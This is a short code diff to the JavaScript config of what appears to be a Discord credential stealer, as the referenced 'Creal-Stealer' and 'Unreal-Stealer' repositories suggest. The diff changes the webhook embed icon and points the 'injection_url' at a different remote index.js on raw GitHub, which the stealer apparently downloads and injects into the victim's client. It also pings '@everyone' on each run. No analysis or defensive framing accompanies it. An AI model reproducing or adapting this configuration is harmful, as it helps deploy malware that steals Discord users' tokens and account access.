@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Caymans Baby', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/avatars/1111784527283634256/bfcb7419d4f31923301c971c10bd4091.png?size=2048'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/DXXNS/Unreal-Stealer/main/index.js', 
   /**
    
    **/
